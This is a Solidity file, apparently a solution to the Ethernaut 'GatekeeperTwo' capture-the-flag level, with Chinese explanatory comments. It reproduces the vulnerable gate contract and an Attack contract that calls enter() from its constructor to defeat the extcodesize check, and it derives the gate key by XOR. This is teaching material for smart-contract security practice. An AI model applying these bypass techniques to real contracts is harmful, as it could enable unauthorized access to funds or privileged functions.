// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关
 *
 * 想一想你从上一个守门人那学到了什么.
 * 第二个门中的 assembly 关键词可以让一个合约访问非原生的 vanilla solidity 功能
 * extcodesize 函数可以用来得到给定地址合约的代码长度
 * ^ 符号在第三个门里是位操作 (XOR), 在这里是代表另一个常见的位操作
 */
contract GatekeeperTwo {
    address public entrant;

    // 调用者为合约
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // extcodesize(caller())指的是攻击合约的长度，因此这里要求在构造函数中攻击
    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    // ^:异或
    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) // _gateKey要对uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))取反
            ==
            type(uint64).max // 这里应该是0xffffffffffffffff
        );
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    constructor(GatekeeperTwo _address) {
        // 取反操作：0^1=1 1^1=0
        // 注意被攻击合约中的msg.sender在这里要改为address(this)
        bytes8 _gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;
        _address.enter(_gateKey);
    }
}
